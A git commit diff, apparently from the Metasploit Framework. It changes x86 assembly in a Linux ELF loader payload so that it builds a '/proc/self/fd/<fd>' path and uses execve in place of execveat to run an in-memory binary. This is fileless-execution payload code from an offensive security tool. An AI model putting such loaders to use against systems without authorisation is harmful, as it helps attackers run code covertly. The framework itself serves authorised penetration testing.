ed87ffeb66747e01c4ca68ce02debaa731e38c0a
dledda-r7 <diego_ledda@rapid7.com>
2025-11-18 08:34:36 -0500

    fix: rollback itoa and execve instead of execveat

--- lib/msf/core/payload/linux/x86/elf_loader.rb
+++ lib/msf/core/payload/linux/x86/elf_loader.rb
@@ -22,14 +22,31 @@ module Msf::Payload::Linux::X86::ElfLoader
         mov esi, eax
         mov eax, 0x4
         int 0x80                            ; write(fd, elfbuffer, elfbuffer_len);
+        jmp get_command
+      got_command:
+        pop ebx
+        mov ecx, 18
+        mov eax, esi
+      itoa:
+        test eax, eax
+        jz execve
+        mov edx, 10
+        div dl
+        mov edx, eax
+        shr edx, 8
+        and eax, 255
+        add edx, 48
+        mov byte [ebx + ecx], dl
+        dec ecx
+        jmp itoa
+      execve:
+        xor ecx, ecx
         xor edx, edx
-        xor esi, esi
-        push edx
-        lea ecx, [esp]
-        push 0x1000
-        pop edi
-        mov eax, 0x166
-        int 0x080                           ; execveat(fd,NULL, NULL, NULL);
+        mov eax, 0xb
+        int 0x080                           ; execve("/proc/self/fd/<fd>", NULL, NULL);
+      get_command:
+        call got_command
+        db "/proc/self/fd//////", 0x00
       get_payload:
         call got_payload
     ^
